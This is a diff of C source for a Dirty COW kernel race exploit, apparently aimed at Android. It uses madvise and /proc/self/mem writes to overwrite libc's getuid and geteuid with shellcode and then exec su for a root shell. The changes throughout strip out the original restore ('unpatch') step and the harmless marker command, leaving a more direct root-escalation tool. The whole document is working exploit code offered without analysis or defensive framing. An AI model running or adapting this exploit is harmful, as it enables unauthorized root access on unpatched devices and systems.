@@ -39,34 +39,15 @@ struct mem_arg  {
 	off_t offset;
 	unsigned int patch_addr;
 	unsigned char *patch;
-	unsigned char *unpatch;
+	unsigned char *check;
 	size_t patch_size;
-	bool do_patch;
 	void *map;
 };
 
 
-static int check(bool do_patch, const char *thread_name)
+static int check(struct mem_arg * mem_arg)
 {
-	uid_t uid;
-
-	uid = getuid();
-	
-	//printf("uid=%d\n", uid);
-
-	if (do_patch) {
-		if (uid == 0) {
-			printf("[*] patched uid=%d (%s)\n", uid, thread_name);
-			return 1;
-		}
-	} else {
-		if (uid != 0) {
-			printf("[*] unpatched: uid=%d (%s)\n", uid, thread_name);
-			return 1;
-		}
-	}
-
-	return 0;
+	return memcmp(mem_arg->patch, mem_arg->check, mem_arg->patch_size) == 0;
 }
 
 
@@ -75,21 +56,17 @@ static void *madviseThread(void *arg)
 	struct mem_arg *mem_arg;
 	size_t size;
 	void *addr;
-	int i, c = 0;
 
 	mem_arg = (struct mem_arg *)arg;
 	addr = (void *)(mem_arg->offset & (~(PAGE_SIZE - 1)));
 	size = mem_arg->offset - (unsigned long)addr;
 
-	for(i = 0; i < LOOP; i++) {
-		c += madvise(addr, size, MADV_DONTNEED);
+	for(int i = 0; i < LOOP; i++) {
+		madvise(addr, size, MADV_DONTNEED);
 
-		if (i % 0x1000 == 0 && check(mem_arg->do_patch, __func__))
+		if (i % 0x1000 == 0 && check(mem_arg))
 			break;
 	}
-
-	if (c == 0x1337)
-		printf("[*] madvise = %d\n", c);
 
 	return NULL;
 }
@@ -97,26 +74,23 @@ static void *madviseThread(void *arg)
 static void *procselfmemThread(void *arg)
 {
 	struct mem_arg *mem_arg;
-	int fd, i, c = 0;
+	int fd;
 	unsigned char *p;
 
 	mem_arg = (struct mem_arg *)arg;
-	p = mem_arg->do_patch ? mem_arg->patch : mem_arg->unpatch;
+	p = mem_arg->patch;
 
 	fd = open("/proc/self/mem", O_RDWR);
 	if (fd == -1)
 		err(1, "open(\"/proc/self/mem\"");
 
-	for (i = 0; i < LOOP; i++) {
+	for (int i = 0; i < LOOP; i++) {
 		lseek(fd, mem_arg->offset, SEEK_SET);
-		c += write(fd, p, mem_arg->patch_size);
+		write(fd, p, mem_arg->patch_size);
 
-		if (i % 0x1000 == 0 && check(mem_arg->do_patch, __func__))
+		if (i % 0x1000 == 0 && check(mem_arg))
 			break;
 	}
-
-	if (c == 0x1337)
-		printf("[*] /proc/self/mem %d\n", c);
 
 	close(fd);
 
@@ -157,17 +131,13 @@ static int get_range(unsigned int *start, unsigned int *end)
 
 static void getroot(void)
 {
-	execlp("su", "su", "-c", "touch /data/local/tmp/rootwasere", NULL);
+	execlp("su", "su", NULL);
 	err(1, "failed to execute \"su\"");
 }
 
-static void exploit(struct mem_arg *mem_arg, bool do_patch)
+static void exploit(struct mem_arg *mem_arg)
 {
 	pthread_t pth1, pth2;
-
-	printf("[*] exploiting (%s)\n", do_patch ? "patch": "unpatch");
-
-	mem_arg->do_patch = do_patch;
 
 	pthread_create(&pth1, NULL, madviseThread, mem_arg);
 	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);
@@ -176,11 +146,11 @@ static void exploit(struct mem_arg *mem_arg, bool do_patch)
 	pthread_join(pth2, NULL);
 }
 
-static unsigned long get_getuid_addr(void)
+void * get_func_addr(char * func)
 {
-	unsigned long addr;
-	void *handle;
-	char *error;
+	void * addr;
+	void * handle;
+	char * error;
 
 	dlerror();
 
@@ -190,7 +160,7 @@ static unsigned long get_getuid_addr(void)
 		exit(EXIT_FAILURE);
 	}
 
-	addr = (unsigned long)dlsym(handle, "getuid");
+	addr = dlsym(handle, func);
 	error = dlerror();
 	if (error != NULL) {
 		fprintf(stderr, "%s\n", error);
@@ -202,35 +172,30 @@ static unsigned long get_getuid_addr(void)
 	return addr;
 }
 
-int main(int argc, char *argv[])
-{
+void patch_libc(char * func, char * offset, char * payload, size_t payload_len) {
 	unsigned int start, end;
-	unsigned int getuid_addr;
+	void * func_addr;
 	struct mem_arg mem_arg;
 	struct stat st;
 	pid_t pid;
 	int fd;
-
+	
 	if (get_range(&start, &end) != 0)
 		errx(1, "failed to get range");
 
-	printf("[*] range: %x-%x]\n", start, end);
+	printf("[*] range: [%x-%x]\n", start, end);
 
-	getuid_addr = get_getuid_addr();
-	printf("[*] getuid = %x\n", getuid_addr);
+	func_addr = get_func_addr(func);
+	printf("[*] %s = %p\n", func, func_addr);
 
-	mem_arg.patch = malloc(sizeof(SHELLCODE)-1);
+	mem_arg.patch = malloc(payload_len);
 	if (mem_arg.patch == NULL)
 		err(1, "malloc");
 
-	mem_arg.unpatch = malloc(sizeof(SHELLCODE)-1);
-	if (mem_arg.unpatch == NULL)
-		err(1, "malloc");
-
-	memcpy(mem_arg.unpatch, (void *)getuid_addr, sizeof(SHELLCODE)-1);
-	memcpy(mem_arg.patch, SHELLCODE, sizeof(SHELLCODE)-1);
-	mem_arg.patch_size = sizeof(SHELLCODE)-1;
-	mem_arg.do_patch = true;
+	mem_arg.check = func_addr;
+	
+	memcpy(mem_arg.patch, payload, payload_len);
+	mem_arg.patch_size = payload_len;
 
 	fd = open(LIBC_PATH, O_RDONLY);
 	if (fd == -1)
@@ -246,23 +211,23 @@ int main(int argc, char *argv[])
 	printf("[*] mmap %p\n", mem_arg.map);
 
 	mem_arg.st = st;
-	mem_arg.offset = (off_t)((unsigned int)mem_arg.map + getuid_addr - start);
+	mem_arg.offset = (off_t)((unsigned int)mem_arg.map + func_addr - start);
 
-	exploit(&mem_arg, true);
+	exploit(&mem_arg);
+	
+	printf("[*] patch complete\n\n");
+}
 
-	pid = fork();
-	if (pid == -1)
-		err(1, "fork");
+int main(int argc, char *argv[])
+{
 
-	if (pid == 0) {
-		getroot();
-	} else {
-		//return 0;
-		sleep(2);
-		exploit(&mem_arg, false);
-		if (waitpid(pid, NULL, 0) == -1)
-			warn("waitpid");
-	}
+	patch_libc("getuid", 0, SHELLCODE, sizeof(SHELLCODE)-1);
+	patch_libc("geteuid", 0, SHELLCODE, sizeof(SHELLCODE)-1);
+
+	printf("getuid() = %d\n", getuid());
+	printf("geteuid() = %d\n", geteuid());
+	
+	getroot();
 
 	return 0;
 }
